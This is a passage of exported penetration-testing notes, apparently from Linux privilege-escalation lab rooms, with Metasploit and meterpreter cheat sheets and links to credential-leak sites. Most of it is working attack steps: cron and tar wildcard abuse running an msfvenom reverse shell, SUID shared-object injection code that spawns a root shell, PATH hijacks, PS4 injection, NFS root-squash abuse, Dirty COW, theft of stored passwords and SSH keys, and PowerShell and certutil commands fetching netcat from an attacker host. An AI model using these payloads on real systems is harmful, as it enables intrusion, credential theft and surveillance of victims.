#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
Make sure that the file is executable:
</rich_text>
        <rich_text family="monospace">chmod +x /home/user/overwrite.sh</rich_text>
        <rich_text>
Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:

</rich_text>
        <rich_text family="monospace">/tmp/rootbash -p</rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">Remember  to remove the modified code, remove the /tmp/rootbash executable and  exit out of the elevated shell before continuing as you will create this  file again later in the room!</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace">rm /tmp/rootbash
exit</rich_text>
        <rich_text>
</rich_text>
      </node>
      <node name="crontab_wildcard" unique_id="58" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655875846" ts_lastsave="1655875940">
        <rich_text>cat/etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh


</rich_text>
        <rich_text family="monospace">cat /usr/local/bin/compress.sh</rich_text>
        <rich_text>

#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *

Note that the tar command is being run with a wildcard (*) in your home directory.
Take a look at the GTFOBins page for </rich_text>
        <rich_text link="webs https://gtfobins.github.io/gtfobins/tar/">tar</rich_text>
        <rich_text>. Note that tar has command line options that let you run other commands as part of a checkpoint feature.
Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
</rich_text>
        <rich_text family="monospace">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf</rich_text>
        <rich_text>
Transfer the shell.elf file to </rich_text>
        <rich_text weight="heavy">/home/user/</rich_text>
        <rich_text> on the Debian VM (you can use </rich_text>
        <rich_text weight="heavy">scp</rich_text>
        <rich_text> or host the file on a webserver on your Kali box and use </rich_text>
        <rich_text weight="heavy">wget</rich_text>
        <rich_text>). Make sure the file is executable:
</rich_text>
        <rich_text family="monospace">chmod +x /home/user/shell.elf</rich_text>
        <rich_text>
Create these two files in /home/user:
</rich_text>
        <rich_text family="monospace">touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf</rich_text>
        <rich_text>
When  the tar command in the cron job runs, the wildcard (*) will expand to  include these files. Since their filenames are valid tar command line  options, tar will recognize them as such and treat them as command line  options rather than filenames.
Set up a netcat listener on  your Kali box on port 4444 and wait for the cron job to run (should not  take longer than a minute). A root shell should connect back to your  netcat listener.

</rich_text>
        <rich_text family="monospace">nc -nvlp 4444</rich_text>
        <rich_text>

</rich_text>
        <rich_text weight="heavy">Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace">rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf</rich_text>
        <rich_text>
</rich_text>
      </node>
      <node name="suid_sgid_known exploit" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655876160" ts_lastsave="1655876161">
        <rich_text>Find all the SUID/SGID executables on the Debian VM:
</rich_text>
        <rich_text family="monospace">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</rich_text>
        <rich_text>
Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. </rich_text>
        <rich_text link="webs https://www.exploit-db.com/">Exploit-DB</rich_text>
        <rich_text>, Google, and GitHub are good places to search!
A  local privilege escalation exploit matching this version of exim  exactly should be available. A copy can be found on the Debian VM at </rich_text>
        <rich_text weight="heavy">/home/user/tools/suid/exim/cve-2016-1531.sh</rich_text>
        <rich_text>.
Run the exploit script to gain a root shell:
</rich_text>
        <rich_text family="monospace">/home/user/tools/suid/exim/cve-2016-1531.sh</rich_text>
        <rich_text>
</rich_text>
      </node>
      <node name="suid_sgid_shared_object_injection" unique_id="60" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655876745" ts_lastsave="1655877029">
        <rich_text>The </rich_text>
        <rich_text weight="heavy">/usr/local/bin/suid-so</rich_text>
        <rich_text> SUID executable is vulnerable to shared object injection.
First, execute the file and note that currently it displays a progress bar before exiting:
</rich_text>
        <rich_text family="monospace">/usr/local/bin/suid-so</rich_text>
        <rich_text>

Run </rich_text>
        <rich_text weight="heavy">strace</rich_text>
        <rich_text> on the file and search the output for open/access calls and for "no such file" errors:
</rich_text>
        <rich_text family="monospace">strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE "open|access|no such file"</rich_text>
        <rich_text>
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)

Note that the executable tries to load the </rich_text>
        <rich_text weight="heavy">/home/user/.config/libcalc.so</rich_text>
        <rich_text> shared object within our home directory, but it cannot be found.
Create the </rich_text>
        <rich_text weight="heavy">.config</rich_text>
        <rich_text> directory for the libcalc.so file:
</rich_text>
        <rich_text family="monospace">mkdir /home/user/.config</rich_text>
        <rich_text>

Example shared object code can be found at </rich_text>
        <rich_text weight="heavy">/home/user/tools/suid/libcalc.c</rich_text>
        <rich_text>. It simply spawns a Bash shell. Compile the code into a shared object at the location the </rich_text>
        <rich_text weight="heavy">suid-so</rich_text>
        <rich_text> executable was looking for it:
</rich_text>
        <rich_text family="monospace">gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c</rich_text>
        <rich_text>

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}

Execute the </rich_text>
        <rich_text weight="heavy">suid-so</rich_text>
        <rich_text> executable again, and note that this time, instead of a progress bar, we get a root shell.
</rich_text>
        <rich_text family="monospace">/usr/local/bin/suid-so</rich_text>
      </node>
      <node name="suid_sgid_environment_variables" unique_id="61" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655877231" ts_lastsave="1655877338">
        <rich_text>The </rich_text>
        <rich_text weight="heavy">/usr/local/bin/suid-env</rich_text>
        <rich_text> executable can be exploited due to  it inheriting the user's PATH environment variable and attempting to  execute programs without specifying an absolute path.

First, execute the file and note that it seems to be trying to start the apache2 webserver:
</rich_text>
        <rich_text family="monospace">/usr/local/bin/suid-env</rich_text>
        <rich_text>

Run strings on the file to look for strings of printable characters:
</rich_text>
        <rich_text family="monospace">strings /usr/local/bin/suid-env</rich_text>
        <rich_text>

user@debian:~$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start

One line ("service apache2 start") suggests that the </rich_text>
        <rich_text weight="heavy">service</rich_text>
        <rich_text>  executable is being called to start the webserver, however the full  path of the executable (/usr/sbin/service) is not being used.
Compile the code located at </rich_text>
        <rich_text weight="heavy">/home/user/tools/suid/service.c</rich_text>
        <rich_text> into an executable called </rich_text>
        <rich_text weight="heavy">service</rich_text>
        <rich_text>. This code simply spawns a Bash shell:
</rich_text>
        <rich_text family="monospace">gcc -o service /home/user/tools/suid/service.c</rich_text>
        <rich_text>
user@debian:~$ cat /home/user/tools/suid/service.c
int main() {
        setuid(0);
        system("/bin/bash -p");
}


Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the </rich_text>
        <rich_text weight="heavy">suid-env</rich_text>
        <rich_text> executable to gain a root shell:
</rich_text>
        <rich_text family="monospace">PATH=.:$PATH /usr/local/bin/suid-env</rich_text>
        <rich_text>

</rich_text>
        <rich_text weight="heavy">Remember to exit out of the root shell before continuing!</rich_text>
        <rich_text>
</rich_text>
      </node>
      <node name="suid_sgid_shell_abuse" unique_id="62" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655877425" ts_lastsave="1655877433">
        <rich_text>The </rich_text>
        <rich_text weight="heavy">/usr/local/bin/suid-env2</rich_text>
        <rich_text> executable is identical to </rich_text>
        <rich_text weight="heavy">/usr/local/bin/suid-env</rich_text>
        <rich_text> except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.

Verify this with strings:
</rich_text>
        <rich_text family="monospace">strings /usr/local/bin/suid-env2
</rich_text>
        <rich_text>
In Bash versions </rich_text>
        <rich_text weight="heavy">&lt;4.2-048</rich_text>
        <rich_text>  it is possible to define shell functions with names that resemble file  paths, then export those functions so that they are used instead of any  actual executable at that file path.
Verify the version of Bash installed on the Debian VM is less than 4.2-048:
</rich_text>
        <rich_text family="monospace">/bin/bash --version</rich_text>
        <rich_text>
Create a Bash function with the name "</rich_text>
        <rich_text weight="heavy">/usr/sbin/service</rich_text>
        <rich_text>" that executes a new Bash shell (using -p so permissions are preserved) and export the function:
</rich_text>
        <rich_text family="monospace">function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service</rich_text>
        <rich_text>
Run the </rich_text>
        <rich_text weight="heavy">suid-env2</rich_text>
        <rich_text> executable to gain a root shell:
</rich_text>
        <rich_text family="monospace">/usr/local/bin/suid-env2</rich_text>
        <rich_text>

</rich_text>
        <rich_text weight="heavy">Remember to exit out of the root shell before continuing!</rich_text>
        <rich_text>
</rich_text>
      </node>
      <node name="suid_sgid_shell_abuse" unique_id="63" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655877686" ts_lastsave="1655877801">
        <rich_text> Note: This will not work on Bash versions 4.4 and above.
When in debugging mode, Bash uses the environment variable </rich_text>
        <rich_text weight="heavy">PS4</rich_text>
        <rich_text> to display an extra prompt for debugging statements.

Run the </rich_text>
        <rich_text weight="heavy">/usr/local/bin/suid-env2</rich_text>
        <rich_text>  executable with bash debugging enabled and the PS4 variable set to an  embedded command which creates an SUID version of /bin/bash:
</rich_text>
        <rich_text family="monospace">env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2</rich_text>
        <rich_text>
Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
</rich_text>
        <rich_text family="monospace">/tmp/rootbash -p</rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">Remember  to remove the /tmp/rootbash executable and exit out of the elevated  shell before continuing as you will create this file again later in the  room!</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace">rm /tmp/rootbash
exit</rich_text>
        <rich_text>
        </rich_text>
      </node>
      <node name="pass_and_key_history" unique_id="64" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655877801" ts_lastsave="1655877965">
        <rich_text>If a user accidentally types their password on the command line  instead of into a password prompt, it may get recorded in a history  file.
View the contents of all the hidden history files in the user's home directory:
</rich_text>
        <rich_text family="monospace">cat ~/.*history | less</rich_text>
        <rich_text>
Note  that the user has tried to connect to a MySQL server at some point,  using the "root" username and a password submitted via the command line.  Note that there is no space between the -p option and the password!
Switch to the root user, using the password:
</rich_text>
        <rich_text family="monospace">su root</rich_text>
      </node>
      <node name="pass_keys_config_files" unique_id="65" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655877846" ts_lastsave="1655877988">
        <rich_text>Config files often contain passwords in plaintext or other reversible formats.
List the contents of the user's home directory:
</rich_text>
        <rich_text family="monospace">ls /home/user</rich_text>
        <rich_text>
Note the presence of a </rich_text>
        <rich_text weight="heavy">myvpn.ovpn</rich_text>
        <rich_text> config file. View the contents of the file:
</rich_text>
        <rich_text family="monospace">cat /home/user/myvpn.ovpn</rich_text>
        <rich_text>
The  file should contain a reference to another location where the root  user's credentials can be found. Switch to the root user, using the  credentials:
</rich_text>
        <rich_text family="monospace">su root</rich_text>
      </node>
      <node name="ssh_keys" unique_id="66" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655877988" ts_lastsave="1655878494">
        <rich_text>Sometimes users make backups of important files but fail to secure them with the correct permissions.
Look for hidden files &amp; directories in the system root:
</rich_text>
        <rich_text family="monospace">ls -la /</rich_text>
        <rich_text>
Note that there appears to be a hidden directory called </rich_text>
        <rich_text weight="heavy">.ssh</rich_text>
        <rich_text>. View the contents of the directory:
</rich_text>
        <rich_text family="monospace">ls -l /.ssh</rich_text>
        <rich_text>
Note that there is a world-readable file called </rich_text>
        <rich_text weight="heavy">root_key</rich_text>
        <rich_text>.  Further inspection of this file should indicate it is a private SSH  key. The name of the file suggests it is for the root user.
Copy the key over to your Kali box (it's easier to just view the contents of the </rich_text>
        <rich_text weight="heavy">root_key</rich_text>
        <rich_text> file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:
</rich_text>
        <rich_text family="monospace">chmod 600 root_key</rich_text>
        <rich_text>
Use the key to login to the Debian VM as the root account:
</rich_text>
        <rich_text family="monospace">ssh -i root_key root@10.10.129.53</rich_text>
      </node>
      <node name="NFS" unique_id="67" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655878494" ts_lastsave="1655878820">
        <rich_text>Files created via NFS inherit the </rich_text>
        <rich_text weight="heavy">remote</rich_text>
        <rich_text> user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
Check the NFS share configuration on the Debian VM:
</rich_text>
        <rich_text family="monospace">cat /etc/exports</rich_text>
        <rich_text>
Note that the </rich_text>
        <rich_text weight="heavy">/tmp</rich_text>
        <rich_text> share has root squashing disabled.
On your Kali box, switch to your root user if you are not already running as root:
</rich_text>
        <rich_text family="monospace">sudo su</rich_text>
        <rich_text>
Using Kali's root user, create a mount point on your Kali box and mount the </rich_text>
        <rich_text weight="heavy">/tmp</rich_text>
        <rich_text> share (update the IP accordingly):
</rich_text>
        <rich_text family="monospace">mkdir /tmp/nfs
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs</rich_text>
        <rich_text>
Still using Kali's root user, generate a payload using </rich_text>
        <rich_text weight="heavy">msfvenom</rich_text>
        <rich_text> and save it to the mounted share (this payload simply calls /bin/bash):
</rich_text>
        <rich_text family="monospace">msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf</rich_text>
        <rich_text>
Still using Kali's root user, make the file executable and set the SUID permission:
</rich_text>
        <rich_text family="monospace">chmod +xs /tmp/nfs/shell.elf</rich_text>
        <rich_text>
Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
</rich_text>
        <rich_text family="monospace">/tmp/shell.elf</rich_text>
        <rich_text>

</rich_text>
        <rich_text weight="heavy">Remember to exit out of the root shell before continuing!</rich_text>
        <rich_text>
</rich_text>
      </node>
      <node name="kernel_exploit" unique_id="68" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655878820" ts_lastsave="1655878821">
        <rich_text>             Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.
Run the </rich_text>
        <rich_text weight="heavy">Linux Exploit Suggester 2</rich_text>
        <rich_text> tool to identify potential kernel exploits on the current system:
</rich_text>
        <rich_text family="monospace">perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl</rich_text>
        <rich_text>
The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at </rich_text>
        <rich_text weight="heavy">/home/user/tools/kernel-exploits/dirtycow/c0w.c</rich_text>
        <rich_text>. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).
Compile the code and run it (note that it may take several minutes to complete):
</rich_text>
        <rich_text family="monospace">gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w</rich_text>
        <rich_text>
Once the exploit completes, run /usr/bin/passwd to gain a root shell:
</rich_text>
        <rich_text family="monospace">/usr/bin/passwd</rich_text>
        <rich_text>
Remember to restore the original </rich_text>
        <rich_text weight="heavy">/usr/bin/passwd</rich_text>
        <rich_text> file and exit the root shell before continuing!
</rich_text>
        <rich_text family="monospace">mv /tmp/bak /usr/bin/passwd
exit</rich_text>
        <rich_text>
        </rich_text>
      </node>
    </node>
    <node name="pivoting" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656313484" ts_lastsave="1664428369">
      <rich_text>sudo ssh -N -L 0.0.0.0:80:192.168.1.105:80 wtf@10.1.2.114 

</rich_text>
      <rich_text link="webs https://0xdf.gitlab.io/2018/06/10/intro-to-ssh-tunneling.html">https://0xdf.gitlab.io/2018/06/10/intro-to-ssh-tunneling.html</rich_text>
      <rich_text>

</rich_text>
      <encoded_png char_offset="123" justification="left" link=""></encoded_png>
    </node>
    <node name="windows_ps_via_cmd" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663520409" ts_lastsave="1663605176">
      <rich_text>powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.2/nc.exe', 'c:\Users\Public\Downloads\nc.exe')"

download
certutil -f -split -urlcache http://10.10.XX.XX/nc.exe C:\temp\nc.exe

tasklist
enum all tasks

netstat -ano
check all open network interface</rich_text>
    </node>
  </node>
  <node name="decrypt_key_ssh" unique_id="98" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664288663" ts_lastsave="1664290655">
    <rich_text>openssl rsa -in hype_key_encrypted -out hype_key_decrypted
</rich_text>
  </node>
  <node name="fix_ssh_key" unique_id="99" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664290655" ts_lastsave="1664290657">
    <rich_text>-o 'PubkeyAcceptedKeyTypes +ssh-rsa'</rich_text>
  </node>
  <node name="obfuscate_deobfuscate" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656818398" ts_lastsave="1656836768">
    <rich_text>de4jse</rich_text>
  </node>
  <node name="metasploit" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655727693" ts_lastsave="1655729074">
    <rich_text>start postgresql for msfdb
</rich_text>
    <rich_text family="monospace">systemctl start postgresql</rich_text>
    <rich_text>

adding workspace
workspace -a &lt;workspace_name&gt;

more info on workspace
workspace -h

run metasploit
sudo msfconsole -q

run msfdb
sudo msfdb init

for help
help

search for module
search &lt;search_query&gt;

get summary of module
info &lt;module_name&gt;
info &lt;search_id&gt;

using module
use &lt;module_name&gt;
use &lt;search_id&gt;

showing module options
options

setting options
set &lt;options&gt; &lt;value&gt;

showing payloads/aux/options of a module
show &lt;what to show&gt;

search by type
search type:auxiliary telnet

set global value
setg &lt;option&gt; &lt;value&gt;

unset global value
unsetg &lt;option&gt;s

running exploit
exploit
exploit -z (background)

background an exploit
CTRL+Z

interacting with different session
sessions -i &lt;session_id&gt;</rich_text>
    <node name="msfvenom" unique_id="43" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655729074" ts_lastsave="1655729220">
      <rich_text>show payloads
msfvenom -l payloads

msfvenom common flag
-f format
-e encoding

example
</rich_text>
      <rich_text family="monospace">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf</rich_text>
    </node>
    <node name="meterpreter" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655729174" ts_lastsave="1655729843">
      <rich_text>get meterpreter pid
</rich_text>
      <rich_text family="monospace">getpid</rich_text>
      <rich_text>

running process
ps

Core commands
    â¢         </rich_text>
      <rich_text family="monospace">background</rich_text>
      <rich_text>: Backgrounds the             current session
    â¢         </rich_text>
      <rich_text family="monospace">exit</rich_text>
      <rich_text>:             Terminate the Meterpreter session
    â¢         </rich_text>
      <rich_text family="monospace">guid</rich_text>
      <rich_text>:             Get the session GUID (Globally Unique Identifier)

    â¢         </rich_text>
      <rich_text family="monospace">help</rich_text>
      <rich_text>:             Displays the help menu
    â¢         </rich_text>
      <rich_text family="monospace">info</rich_text>
      <rich_text>:             Displays information about a Post module
    â¢         </rich_text>
      <rich_text family="monospace">irb</rich_text>
      <rich_text>:             Opens an interactive Ruby shell on the current session
    â¢         </rich_text>
      <rich_text family="monospace">load</rich_text>
      <rich_text>:             Loads one or more Meterpreter extensions
    â¢         </rich_text>
      <rich_text family="monospace">migrate</rich_text>
      <rich_text>: Allows you to             migrate Meterpreter to another process
    â¢         </rich_text>
      <rich_text family="monospace">run</rich_text>
      <rich_text>:             Executes a Meterpreter script or Post module
    â¢         </rich_text>
      <rich_text family="monospace">sessions</rich_text>
      <rich_text>: Quickly switch to             another session
File system         commands
    â¢         </rich_text>
      <rich_text family="monospace">cd</rich_text>
      <rich_text>:             Will change directory
    â¢         </rich_text>
      <rich_text family="monospace">ls</rich_text>
      <rich_text>:             Will list files in the current directory (dir will also work)
    â¢         </rich_text>
      <rich_text family="monospace">pwd</rich_text>
      <rich_text>:             Prints the current working directory
    â¢         </rich_text>
      <rich_text family="monospace">edit</rich_text>
      <rich_text>:             will allow you to edit a file
    â¢         </rich_text>
      <rich_text family="monospace">cat</rich_text>
      <rich_text>:             Will show the contents of a file to the screen
    â¢         </rich_text>
      <rich_text family="monospace">rm</rich_text>
      <rich_text>:             Will delete the specified file
    â¢         </rich_text>
      <rich_text family="monospace">search</rich_text>
      <rich_text>:             Will search for files
    â¢         </rich_text>
      <rich_text family="monospace">upload</rich_text>
      <rich_text>:             Will upload a file or directory
    â¢         </rich_text>
      <rich_text family="monospace">download</rich_text>
      <rich_text>: Will download a file             or directory
Networking commands 
    â¢         </rich_text>
      <rich_text family="monospace">arp</rich_text>
      <rich_text>:             Displays the host ARP (Address Resolution Protocol) cache
    â¢         </rich_text>
      <rich_text family="monospace">ifconfig</rich_text>
      <rich_text>: Displays network             interfaces available on the target system

    â¢         </rich_text>
      <rich_text family="monospace">netstat</rich_text>
      <rich_text>: Displays the network             connections
    â¢         </rich_text>
      <rich_text family="monospace">portfwd</rich_text>
      <rich_text>: Forwards a local             port to a remote service
    â¢         </rich_text>
      <rich_text family="monospace">route</rich_text>
      <rich_text>:             Allows you to view and modify the routing table
System commands
    â¢         </rich_text>
      <rich_text family="monospace">clearev</rich_text>
      <rich_text>: Clears the event             logs
    â¢         </rich_text>
      <rich_text family="monospace">execute</rich_text>
      <rich_text>: Executes a             command
    â¢         </rich_text>
      <rich_text family="monospace">getpid</rich_text>
      <rich_text>:             Shows the current process identifier
    â¢         </rich_text>
      <rich_text family="monospace">getuid</rich_text>
      <rich_text>:             Shows the user that Meterpreter is running as
    â¢         </rich_text>
      <rich_text family="monospace">kill</rich_text>
      <rich_text>:             Terminates a process
    â¢         </rich_text>
      <rich_text family="monospace">pkill</rich_text>
      <rich_text>:             Terminates processes by name
    â¢         </rich_text>
      <rich_text family="monospace">ps</rich_text>
      <rich_text>:             Lists running processes
    â¢         </rich_text>
      <rich_text family="monospace">reboot</rich_text>
      <rich_text>:             Reboots the remote computer
    â¢         </rich_text>
      <rich_text family="monospace">shell</rich_text>
      <rich_text>:             Drops into a system command shell
    â¢         </rich_text>
      <rich_text family="monospace">shutdown</rich_text>
      <rich_text>: Shuts down the             remote computer
    â¢         </rich_text>
      <rich_text family="monospace">sysinfo</rich_text>
      <rich_text>: Gets information             about the remote system, such as OS
Others Commands (these         will be listed under different menu categories in the help menu)
    â¢         </rich_text>
      <rich_text family="monospace">idletime</rich_text>
      <rich_text>: Returns the number             of seconds the remote user has been idle
    â¢         </rich_text>
      <rich_text family="monospace">keyscan_dump</rich_text>
      <rich_text>: Dumps the keystroke             buffer
    â¢         </rich_text>
      <rich_text family="monospace">keyscan_start</rich_text>
      <rich_text>: Starts capturing             keystrokes
    â¢         </rich_text>
      <rich_text family="monospace">keyscan_stop</rich_text>
      <rich_text>: Stops capturing             keystrokes
    â¢         </rich_text>
      <rich_text family="monospace">screenshare</rich_text>
      <rich_text>: Allows you to watch             the remote user's desktop in real time
    â¢         </rich_text>
      <rich_text family="monospace">screenshot</rich_text>
      <rich_text>: Grabs a screenshot             of the interactive desktop
    â¢         </rich_text>
      <rich_text family="monospace">record_mic</rich_text>
      <rich_text>: Records audio from             the default microphone for X seconds
    â¢         </rich_text>
      <rich_text family="monospace">webcam_chat</rich_text>
      <rich_text>: Starts a video             chat
    â¢         </rich_text>
      <rich_text family="monospace">webcam_list</rich_text>
      <rich_text>: Lists webcams    
    â¢         </rich_text>
      <rich_text family="monospace">webcam_snap</rich_text>
      <rich_text>: Takes a snapshot             from the specified webcam
    â¢         </rich_text>
      <rich_text family="monospace">webcam_stream</rich_text>
      <rich_text>: Plays a video stream             from the specified webcam
    â¢         </rich_text>
      <rich_text family="monospace">getsystem</rich_text>
      <rich_text>: Attempts to elevate             your privilege to that of local system
    â¢         </rich_text>
      <rich_text family="monospace">hashdump</rich_text>
      <rich_text>: Dumps the contents             of the SAM database


loading python into meterpreter
load python

loading kiwi into meterpreter
load kiwi
</rich_text>
    </node>
  </node>
  <node name="general_items" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655395204" ts_lastsave="1661234728">
    <rich_text foreground="#d4d4d4">pipelining:</rich_text>
    <rich_text>
</rich_text>
    <rich_text foreground="#dcdcaa">echo</rich_text>
    <rich_text foreground="#d4d4d4"> </rich_text>
    <rich_text foreground="#ce9178">"create file"</rich_text>
    <rich_text foreground="#d4d4d4"> &gt; &lt;filename&gt;</rich_text>
    <rich_text>
</rich_text>
    <rich_text foreground="#dcdcaa">echo</rich_text>
    <rich_text foreground="#d4d4d4"> </rich_text>
    <rich_text foreground="#ce9178">"append text"</rich_text>
    <rich_text foreground="#d4d4d4"> &gt;&gt; &lt;filename&gt;</rich_text>
    <rich_text>

</rich_text>
    <rich_text foreground="#d4d4d4">check current user
whoami</rich_text>
    <rich_text>

</rich_text>
    <rich_text foreground="#d4d4d4">check current directory </rich_text>
    <rich_text>
</rich_text>
    <rich_text foreground="#dcdcaa">pwd</rich_text>
  </node>
  <node name="OSINT" unique_id="89" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1661234728" ts_lastsave="1661234729">
    <rich_text link="webs https://leak.sx/">https://leak.sx</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs http://scylla.sh/">http://scylla.sh</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://intelx.io/">https://intelx.io</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://4iq.com/">https://4iq.com</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://leaked.site/">https://leaked.site</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://hashes.org/">https://hashes.org</rich_text>
    <rich_text>

</rich_text>
